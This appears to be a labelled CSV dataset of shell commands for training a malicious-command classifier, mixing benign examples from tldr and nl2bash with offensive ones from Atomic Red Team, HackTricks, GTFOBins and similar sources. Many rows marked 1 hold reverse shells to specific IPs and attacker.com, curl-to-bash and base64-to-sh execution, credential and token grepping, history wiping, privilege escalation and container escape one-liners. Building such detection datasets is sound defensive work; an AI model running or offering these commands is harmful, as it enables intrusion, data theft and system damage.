id,command,label,source,split
d1_012662,git gui citool,0,tldr,train
d1_012663,cp manifest.sh manifest.sh.bak,0,bash_instruct,train
d1_012664,syft image:tag [-o|--output] cyclonedx-json,0,tldr,train
d1_012665,sudo chgrp users backup.txt,0,bash_instruct,train
d1_012667,find /path/to/dir -mindepth 1 -maxdepth 1 -type d -execdir sudo tar -zcpvf {}.tar.gz {} \;,0,nl2bash,train
d1_012668,jj config [e|edit] --repo,0,tldr,train
d1_012673,ssh jenkins@monitor.corp.net,0,bash_instruct,train
d1_012674,sudo chgrp deploy payment.json,0,bash_instruct,train
d1_012675,chmod 777 /usr/bin/wget,0,nl2bash,train
d1_012676,xwd -root -out /tmp/T1113_desktop.xwd,1,atomic_red_team,train
d1_012678,tsc --watch,0,linlm,train
d1_012679,cp -u archive.html build/,0,bash_instruct,train
d1_012680,sudo chown -R tomcat:deploy modules,0,bash_instruct,train
d1_012681,last [-n|--limit] login_count,0,tldr,train
d1_012682,cp -p credentials.png data/,0,bash_instruct,train
d1_012684,ln -s log_2023_09_01.txt latest.log,0,bash6k,train
d1_012685,"./linpeas.sh -d 41.211.243.250/24 -p 22,80,443",1,hacktricks,train
d1_012687,mv -n data.yaml data.yaml.old,0,bash_instruct,train
d1_012688,full_backup_dir=$(find . -depth \( -wholename \./\.\* \) -prune -o -mtime -1 -print),0,nl2bash,train
d1_012689,netstat -tn | grep db02.service.io,0,bash_instruct,train
d1_012693,longbridge quote NVDA.US,0,tldr,train
d1_012694,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/145.170.68.118/$port) && echo port $port is open ; done,1,atomic_red_team,train
d1_012695,tail -n 20 test.jpg,0,bash_instruct,train
d1_012696,chmod go-w users.png,0,bash_instruct,train
d1_012697,bup [-d|--bup-dir] path/to/repository restore [-C|--outdir] path/to/target_directory backup_name,0,tldr,train
d1_012698,docker [tag|image tag],0,tldr,train
d1_012699,grep 'Connection refused' cron.log,0,bash_instruct,train
d1_012702,while(pi.available()>0)so.write(pi.read());,1,gtfobins,train
d1_012704,directus bootstrap,0,linlm,train
d1_012705,grep '^[0-9]' data.txt\n1 This is the first line\n2 Another line starting with a number,0,bash6k,train
d1_012706,chmod 744 manifest.yaml,0,bash_instruct,train
d1_012707,sudo abroot pkg list,0,tldr,train
d1_012710,tldr pamflip,0,tldr,train
d1_012712,"find / -user vivek -name ""*.sh""",0,nl2bash,train
d1_012714,iconv [-l|--list],0,tldr,train
d1_012715,sudo chown deploy export.py,0,bash_instruct,train
d1_012716,stat -c '%s' transaction.png,0,bash_instruct,train
d1_012717,"declare -g variable=""value""",0,tldr,train
d1_012718,sort -nr scores.txt,0,bash6k,train
d1_012719,rnm -u,0,tldr,train
d1_012720,cointop clean,0,tldr,train
d1_012721,qtgrace -log x path/to/file1.dat path/to/file2.dat ...,0,tldr,train
d1_012722,nmap -sT -Pn --open 76.132.177.92,1,hacktricks,train
d1_012723,export PATH=$PATH:path/to/append,0,tldr,train
d1_012725,rsstail -r -u url,0,tldr,train
d1_012726,asterisk -r,1,gtfobins,train
d1_012727,ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null,1,slp,train
d1_012730,git log -5 --oneline,0,bash6k,train
d1_012731,git ls-files [-o|--others],0,tldr,train
d1_012732,cp -rf --remove-destination `readlink file` file,0,nl2bash,train
d1_012733,http_load -parallel 5 -fetches 1000 path/to/urls.txt,0,tldr,train
d1_012735,chmod +x ~/bin/free,1,hacktricks,train
d1_012736,"read -n 1 -p ""Is this a good question (y/n)? "" answer",0,nl2bash,train
d1_012738,powerstat -d 0,0,linlm,train
d1_012739,find /nas -type d,0,nl2bash,train
d1_012741,sudo firewall-cmd --list-all 2>/dev/null,1,hacktricks,train
d1_012742,cat index.ini | sort -u,0,bash_instruct,train
d1_012743,jq -r '.ip' log.json | sort | uniq -c | sort -rn,0,bash6k,train
d1_012744,quickget --create-config os path/to/iso,0,tldr,train
d1_012745,wc -w sales.bak,0,bash_instruct,train
d1_012746,git show-ref --branches,0,tldr,train
d1_012747,check_statusfile /path/to/input-file,1,gtfobins,train
d1_012748,"mkdir -p ""$APP/bin"" ""$APP/default""",1,hacktricks,train
d1_012749,"printf 'warn ""[+] RUBYOPT preload reached""\n' > /tmp/rubylib/ht.rb",1,hacktricks,train
d1_012750,sudo pvscan --cache --listvg /dev/sdX,0,tldr,train
d1_012751,nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null,1,hacktricks,train
d1_012752,find ./ -type f -exec grep https://hb5f49324.example.net {} \;,0,nl2bash,train
d1_012754,env | grep -iE 'token|cookie|session',1,hacktricks,train
d1_012755,find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null,1,hacktricks,train
d1_012757,npm pkg fix,0,tldr,train
d1_012759,conda notices [-c|--channel] channel_name,0,tldr,train
d1_012760,http://h31f34559.example.net/?cmd=>zzz,1,hacktricks,train
d1_012761,hg branch,0,tldr,train
d1_012762,httprobe --help,0,tldr,train
d1_012763,tlmgr backup --all,0,tldr,train
d1_012764,ls ~-,0,tldr,train
d1_012765,bzip2 -dc archive.bz2 | less,0,bash6k,train
d1_012767,cat index.tsv | sort | uniq,0,bash_instruct,train
d1_012768,zstd document.txt,0,linlm,train
d1_012769,sudo chgrp staff build.png,0,bash_instruct,train
d1_012770,tar -I pbzip2 -cf OUTPUT_FILE.tar.bz2 paths_to_archive,0,nl2bash,train
d1_012771,wc -l < data.txt,0,bash6k,train
d1_012772,"find FFF -name ""*.txt"" -exec md5sum '{}' \;",0,nl2bash,train
d1_012773,sudo tcpdump -i lo -A -s0 'tcp port 80 or tcp port 8080',1,hacktricks,train
d1_012775,pg_upgrade [-k|--link] [-b|--old-bindir] path/to/old_bin [-B|--new-bindir] path/to/new_bin [-d|--old-datadir] path/to/old_data [-D|--new-datadir] path/to/new_data,0,tldr,train
d1_012776,mosquitto_passwd -U path/to/password_file,0,tldr,train
d1_012777,ls -la tests,0,bash_instruct,train
d1_012778,rm -rf example/,0,bash6k,train
d1_012780,dutree --no-hidden,0,tldr,train
d1_012783,find . -name '*.py' -print0 | xargs -0 grep 'something' > output.txt,0,nl2bash,train
d1_012784,"ps aux | awk 'NR>1 {print $2, $1, $4, $11}' | sort -k3 -nr | head -n 5",0,bash6k,train
d1_012785,find /etc/ -readable -type f -maxdepth 1 2>/dev/null,1,slp,train
d1_012787,ss -tn dst auth.internal,0,bash_instruct,train
d1_012789,du -ch Videos/*.mp4 | grep total,0,bash6k,train
d1_012792,chmod 744 manifest.gz,0,bash_instruct,train
d1_012793,w | wc -l,0,bash_instruct,train
d1_012794,[ -f metrics.tmp ] && cat metrics.tmp || echo 'not found',0,bash_instruct,train
d1_012795,"find ./ -name '*.log' | xargs -I{} sh -c ""if [ -f {}.gz ]; then rm {}; fi""",0,nl2bash,train
d1_012796,unzip -l some-jars-and-textfiles.zip | tr '[:blank:]' \\t | cut -f 5 | grep jar,0,nl2bash,train
d1_012797,file manifest.txt,0,bash_instruct,train
d1_012799,nc -eu sh 134.164.28.222 53,1,quasarnix,train
d1_012800,PATH=$PATH:/path/to/temp-dir/ zypper x,1,gtfobins,train
d1_012801,resize2fs /dev/sdXN,0,tldr,train
d1_012804,cp -u credentials.old bin/,0,bash_instruct,train
d1_012805,cd $(which oracle | xargs dirname),0,nl2bash,train
d1_012809,0<&3;exec 3<>/dev/tcp/5.247.55.113/8000; /usr/bin/sh <&3 >&3 2>&3,1,quasarnix,train
d1_012811,mkdir -p /dev/shm/fakehome/.gnupg,1,hacktricks,train
d1_012812,"pkill [-f|--full] ""command_name""",0,tldr,train
d1_012813,strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head,1,hacktricks,train
d1_012814,find <dir> -mtime +7,0,nl2bash,train
d1_012815,nicotine,0,tldr,train
d1_012817,/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket,1,gtfobins,train
d1_012818,tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root,1,gtfobins,train
d1_012819,find ./ -type f \( -iname \*.jpg -o -iname \*.png \),0,nl2bash,train
d1_012822,password=$(openssl passwd -1 art),1,atomic_red_team,train
d1_012823,pip install git+https://h0caaf24a.example.net/user/repository.git,0,tldr,train
d1_012824,rsync -avz --delete modules/ erin@mail.example.com:/backup/,0,bash_instruct,train
d1_012826,"nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo ""nsenter blocked""",1,hacktricks,train
d1_012827,systemd-nspawn [-D|--directory] path/to/container_root [-a|--as-pid2],0,tldr,train
d1_012828,"dbus-monitor ""type=method_call"" ""type=method_return"" ""type=error""",1,hacktricks,train
d1_012829,ip [ru|rule],0,tldr,train
d1_012830,zeroclaw agent,0,tldr,train
d1_012831,gst-discoverer-1.0 path/to/file,0,tldr,train
d1_012832,chattr +i /path/to/input-file,1,gtfobins,train
d1_012833,chown -R antoniod:antoniod /var/antoniod-data/,0,nl2bash,train
d1_012834,pstree -p erin,0,bash_instruct,train
d1_012835,sudo tlp-stat --psup,0,tldr,train
d1_012837,git flow feature finish feature_name,0,linlm,train
d1_012838,mount /tmp/loop.img /mnt/image -o loop,0,nl2bash,train
d1_012839,vhs path/to/file.tape,0,tldr,train
d1_012840,b2sum [-c|--check] path/to/file.b2,0,tldr,train
d1_012841,cat session.log | sort -u,0,bash_instruct,train
d1_012842,grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+' summary.csv | sort -u,0,bash_instruct,train
d1_012845,sed '/^$/d' access.md,0,bash_instruct,train
d1_012846,find static -name '*.sh' -print0 | xargs -0 grep -l TODO,0,bash_instruct,train
d1_012847,chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002,1,atomic_red_team,train
d1_012848,pinout,0,tldr,train
d1_012852,sudo chown dave error.log,0,bash_instruct,train
d1_012853,openfortivpn [-u|--username] username [-p|--password] password,0,tldr,train
d1_012855,0<&3;exec 3<>/dev/tcp/51.12.139.196/80; bash <&3 >&3 2>&3,1,quasarnix,train
d1_012857,sd [-p|--preview] 'window.fetch' 'fetch' path/to/file.js,0,tldr,train
d1_012858,ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null,1,hacktricks,train
d1_012859,ldapdomaindump -u domain\user -p password 76.132.177.92 -o /tmp/T1087,1,atomic_red_team,train
d1_012860,nl -ba | sed 786q | grep . | awk '{print $2$1}',0,nl2bash,train
d1_012862,"pnmconvol -matrixfile path/to/matrix1,path/to/matrix2,... path/to/image.pnm > path/to/output.pnm",0,tldr,train
d1_012864,nmap -A -T4 scanme.nmap.org,1,payloads,train
d1_012865,mv payload.jpg tests/,0,bash_instruct,train
d1_012866,git config --global [-e|--edit],0,tldr,train
d1_012867,"ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash",1,hacktricks,train
d1_012869,linode-cli domains records-list domain_id,0,tldr,train
d1_012870,grep -ri password /,1,atomic_red_team,train
d1_012872,systemctl is-active mongod,0,bash_instruct,train
d1_012876,grumphp git:init,0,tldr,train
d1_012877,aider --help,0,tldr,train
d1_012879,aider --model model_name --api-key your_api_key,0,tldr,train
d1_012881,for i in $findsuid; do cp $i $format/suid-files/; done 2>/dev/null,1,slp,train
d1_012882,koji tag-build tag NVR1 NVR2 ... --force,0,tldr,train
d1_012883,oh-my-posh get shell,0,tldr,train
d1_012884,.PS,1,gtfobins,train
d1_012885,"find . -type f -exec sed -i ""s/1\.2\.3\.4/99.251.159.70/g"" {} \",0,nl2bash,train
d1_012886,curl --unix-socket /var/run/docker.sock -X POST http://h33438904.example.net/v1.54/containers/helper/start,1,hacktricks,train
d1_012887,cat catalog.md | sort | uniq,0,bash_instruct,train
d1_012888,cat summary.txt | wc -l,0,bash_instruct,train
d1_012889,git scp remote_name HEAD~1,0,tldr,train
d1_012890,"echo -n ""HelloWorld"" | sha256sum",0,bash6k,train
d1_012892,tail -n 20 account.jpg,0,bash_instruct,train
d1_012894,footclient [-F|--fullscreen],0,tldr,train
d1_012895,gcloud iam roles create role_name --organization|project organization|project_id --file path/to/role.yaml,0,tldr,train
d1_012896,udevadm info --export-db,0,linlm,train
d1_012897,cp profile.bak static/,0,bash_instruct,train
d1_012898,posh [-h|--help],0,tldr,train
d1_012899,find PATH_TO_FOLDER -maxdepth 1 -type f -exec bzip2 -zk {} \;,0,nl2bash,train
d1_012901,echo b > /proc/sysrq-trigger,1,hacktricks,train
d1_012902,pkgctl diff [-l|--list] path/to/file|pkgname,0,tldr,train
d1_012903,find /home/username/public_html/modules -type f -exec chmod 640 {} +,0,nl2bash,train
d1_012904,chflags nosimmutable /tmp/T1222.002.txt,1,atomic_red_team,train
d1_012906,Name=Evil Desktop Entry,1,hacktricks,train
d1_012907,installer -pkginfo [-pkg|-package] path/to/package.pkg,0,tldr,train
d1_012908,"aws ssm start-session --target ""instance_id"" --document-name ""AWS-StartPortForwardingSessionToRemoteHost"" --parameters '{""portNumber"":[""remote_port""],""localPortNumber"":[""local_port""]}'",0,tldr,train
d1_012910,btm [-r|--rate] 250 [-t|--default_time_value] 30000,0,tldr,train
d1_012912,scp tomcat@backup.internal:/var/log/nginx-access.log .,0,bash_instruct,train
d1_012915,echo 'uname -a' >> /tmp/art_payload.sh,1,atomic_red_team,train
d1_012916,cp /tmp/payload .,1,hacktricks,train
d1_012917,find / -links -2 -print,0,nl2bash,train
d1_012918,du -h downloads/* 2>/dev/null | sort -rh | head -n 5,0,bash_instruct,train
d1_012919,find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100,1,hacktricks,train
d1_012920,"bash -c ""{echo,\""$(echo $ENCODED)\""}|{base64,-d}""",1,atomic_red_team,train
d1_012922,cp transaction.css config/,0,bash_instruct,train
d1_012923,cat product.ini | sort -u,0,bash_instruct,train
d1_012924,git reset --hard commit,0,tldr,train
d1_012925,inotifywait path/to/file,0,tldr,train
d1_012926,stat account.gz,0,bash_instruct,train
d1_012928,"sed 's/\t/,/g' build.json > build.json.csv",0,bash_instruct,train
d1_012930,cat event.conf | wc -l,0,bash_instruct,train
d1_012931,fswebcam --timestamp timestamp filename,0,tldr,train
d1_012932,mkdir -p /var/log/json_events,0,bash6k,train
d1_012934,gow run .,0,tldr,train
d1_012935,hexdump [-C|--canonical] path/to/file,0,tldr,train
d1_012936,sudo -u root vim -c '!sh',1,payloads,train
d1_012937,libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000),1,hacktricks,train
d1_012938,"sed 's/\t/,/g' catalog.conf > catalog.conf.csv",0,bash_instruct,train
d1_012939,find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50,1,hacktricks,train
d1_012940,nl access.txt,0,bash_instruct,train
d1_012941,docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity,1,hacktricks,train
d1_012943,scp -v secret.key backup.example.com:/backups/,0,bash6k,train
d1_012944,apachectl configtest,0,linlm,train
d1_012945,"su -c ""whoami"" nobody",1,atomic_red_team,train
d1_012946,npm publish --dry-run,0,tldr,train
d1_012947,transfersh path/to/file,0,tldr,train
d1_012948,diff -qr dir1/ dir2/,0,bash6k,train
d1_012949,curl -s https://h3cf88e0a.example.net/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh |bash,1,atomic_red_team,train
d1_012950,truncate -s0 ~/.bash_history,1,atomic_red_team,train
d1_012951,rsync -a --progress --remove-source-files src/test/ dest,0,nl2bash,train
d1_012952,mv auth.conf auth.conf.old,0,bash_instruct,train
d1_012953,sudo vpnserver start && sudo vpncmd,0,linlm,train
d1_012954,doctl auth switch --context token_label,0,tldr,train
d1_012955,find ~/html/ -name '*.html' -exec grep organic '{}' ';',0,nl2bash,train
d1_012956,wc -l settings.html,0,bash_instruct,train
d1_012957,find . -type f -exec file {} \; | grep -o -P '^.+: \w+ image',0,nl2bash,train
d1_012959,pkg install -y --no-repo-update ./x-1.0.txz,1,gtfobins,train
d1_012961,cat /etc/pam.d/passwd,1,atomic_red_team,train
d1_012963,/usr/bin/dash -i >& /dev/udp/124.9.99.245/443 0>&1,1,quasarnix,train
d1_012964,scp archive.old admin@mail.example.org:/tmp/,0,bash_instruct,train
d1_012965,0x000000000000001d (RUNPATH) Library runpath: [/development],1,hacktricks,train
d1_012966,ssh -p 22 tomcat@auth.service.io,0,bash_instruct,train
d1_012967,chmod go-w report.gz,0,bash_instruct,train
d1_012968,if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi;,1,atomic_red_team,train
d1_012969,w3m -dump /path/to/input-file,1,gtfobins,train
d1_012970,"sudo smartctl -a /dev/sda | grep -E ""(Reallocated|Pending|Uncorrectable)""",0,linlm,train
d1_012971,<Alt q>|<Ctrl c>,0,tldr,train
d1_012973,sudo systemctl list-unit-files --type=service,0,linlm,train
d1_012974,pdfbook2 path/to/file.pdf,0,tldr,train
d1_012975,"systemctl status atomic-transient.service 2>/dev/null || echo ""Transient service has already completed and exited.""",1,atomic_red_team,train
d1_012976,mv *.conf logs/,0,bash_instruct,train
d1_012978,nc -z -w 1 192.168.1.$i $j > /dev/null 2>&1;,1,payloads,train
d1_012979,mv index.csv assets/,0,bash_instruct,train
d1_012980,echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | b64decode -r | sh,1,atomic_red_team,train
d1_012981,cat <<'EOF' > /tmp/crash.c int main(void) { char buf[1]; for (int i = 0; i < 100; i++) buf[i] = 1; return 0; } EOF,1,hacktricks,train
d1_012982,nc -cu /usr/bin/dash 98.140.71.28 60105,1,quasarnix,train
d1_012983,head -n 1 report.md,0,bash_instruct,train
d1_012984,ln -s $(pwd) selflink,0,bash6k,train
d1_012985,iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP,1,hacktricks,train
d1_012986,"grep -R ""tenant-upload\|tenant-list"" /opt /usr 2>/dev/null | head",1,hacktricks,train
d1_012988,"i3-nagbar [-B|--button-no-terminal] ""button text"" command [-m|--message] ""error message""",0,tldr,train
d1_012989,"echo ""GET https://h0caaf24a.example.net"" | vegeta attack -duration=30s -rate=10",0,tldr,train
d1_012990,./linpeas.sh -d 41.211.243.250/24,1,hacktricks,train
d1_012991,chmod +x /usr/local/etc/rc.d/art-test,1,atomic_red_team,train
d1_012992,sudo systemctl disable slow-service,0,linlm,train
d1_012993,vt domain url,0,tldr,train
d1_012994,csh -c 'echo DATA >/path/to/output-file' -b,1,gtfobins,train
d1_012995,"rsync --list-only --include ""*2012*.xml"" -exclude ""*.xml"" serveripaddress::pt/dir/files/ --port=111 > output.txt",0,nl2bash,train
d1_012997,mv -n event.gz event.gz.old,0,bash_instruct,train
d1_012998,mkdir -p ~/foo/bar/baz ~/foo/bar/bif ~/foo/boo/bang,0,nl2bash,train
d1_012999,rclone copy path/to/source_file_or_directory remote_name:path/to/directory,0,tldr,train
d1_013001,clido edit text_editor,0,tldr,train
d1_013002,hledger [areg|aregister] assets:bank:checking,0,tldr,train
d1_013003,find $allsuid -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null,1,slp,train
d1_013004,view /boot/config-$(uname -r),0,nl2bash,train
d1_013005,cat users.log | sort -u,0,bash_instruct,train
d1_013006,ufw status numbered,1,atomic_red_team,train
d1_013007,expand -t 1 space.txt > tab.txt,0,bash6k,train
d1_013008,cat build.yaml | wc -l,0,bash_instruct,train
d1_013009,packwiz modrinth|curseforge add url|slug|search_term,0,tldr,train
d1_013010,sed -i 's/user_id/user_id/g' results.yaml,0,bash_instruct,train
d1_013011,less -N file.txt,0,nl2bash,train
d1_013012,echo DATA | dd of=/path/to/output-file,1,gtfobins,train
d1_013013,rpmverify --eval '%(/bin/sh 1>&2)',1,gtfobins,train
d1_013014,"tree -dfi -L 1 ""$(pwd)""",0,nl2bash,train
d1_013015,electerm,0,linlm,train
d1_013016,bundletool dump resources --bundle path/to/bundle.aab --resource type/name,0,tldr,train
d1_013017,choose [-x|--exclusive] 1:4,0,tldr,train
d1_013018,dropdb [-w|--no-password] database_name,0,tldr,train
d1_013019,switch_root new_root /sbin/init,0,tldr,train
d1_013020,"find ~/some/directory -name ""*rb"" -exec basename {} \;",0,nl2bash,train
d1_013021,sudo systemctl enable --now typesense,0,linlm,train
d1_013022,systemd-tmpfiles --remove,0,tldr,train
